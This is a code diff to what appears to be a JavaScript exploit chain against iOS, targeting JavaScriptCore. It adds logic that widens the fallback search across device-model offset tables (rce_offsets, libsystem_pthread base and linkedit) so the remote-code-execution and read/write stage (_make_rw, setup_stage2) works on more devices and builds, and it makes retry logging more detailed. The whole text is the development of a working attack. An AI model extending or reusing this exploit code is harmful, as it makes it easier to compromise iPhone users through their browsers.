@@ -18236,6 +18236,31 @@ const device_chipset = {
           const linkedit_map = linkedit_to_device[ios_version];
           if (!linkedit_map)
               throw new TryAgainError(`missing linkedit map for ios_version=${ios_version}`);
+          function buildSuffixForModel(candidate_device_model) {
+              const parts = String(candidate_device_model).split("_");
+              return parts[parts.length - 1] || "";
+          }
+          function addFallbackModel(models, seen, candidate_device_model) {
+              if (!candidate_device_model || seen[candidate_device_model]) return;
+              seen[candidate_device_model] = true;
+              models.push(candidate_device_model);
+          }
+          function expandedFallbackModels() {
+              const models = [];
+              const seen = {};
+              const builds = {};
+              for (const key of Object.keys(linkedit_map)) {
+                  const candidate_device_model = linkedit_map[key];
+                  addFallbackModel(models, seen, candidate_device_model);
+                  const build = buildSuffixForModel(candidate_device_model);
+                  if (build) builds[build] = true;
+              }
+              for (const candidate_device_model of Object.keys(rce_offsets)) {
+                  const build = buildSuffixForModel(candidate_device_model);
+                  if (builds[build]) addFallbackModel(models, seen, candidate_device_model);
+              }
+              return { models, builds };
+          }
           let pthread_create_got = 0n;
           let pthread_create = 0n;
           let libsystem_pthread_base = 0n;
@@ -18290,10 +18315,9 @@ const device_chipset = {
           }
           if (!device_model) {
               resolverCheckpoint("auth stub resolver failed; trying offset table fallback");
-              const seenFallbackModels = {};
-              for (const candidate_device_model of Object.keys(linkedit_map).map(key => linkedit_map[key])) {
-                  if (seenFallbackModels[candidate_device_model]) continue;
-                  seenFallbackModels[candidate_device_model] = true;
+              const fallback = expandedFallbackModels();
+              resolverCheckpoint(`fallback model candidates=${fallback.models.length} builds=${Object.keys(fallback.builds).join(",")}`);
+              for (const candidate_device_model of fallback.models) {
                   const candidate_offsets = rce_offsets[candidate_device_model];
                   if (!candidate_offsets || !candidate_offsets.JavaScriptCore__globalFuncParseFloat || !candidate_offsets.libsystem_pthread_base || !candidate_offsets.libsystem_pthread_linkedit) {
                       resolverCheckpoint(`fallback skip ${candidate_device_model}: missing offsets`);
@@ -18570,7 +18594,8 @@ const device_chipset = {
         print("setup_stage2: setup_stage2_prim returned");
     } catch (e) {
         if (e instanceof TryAgainError) {
-            print('failed _make_rw ... retry');
+            const reason = e.message ? `: ${e.message}` : "";
+            print(`failed _make_rw ... retry${reason}`);
         } else {
             throw e;
         }
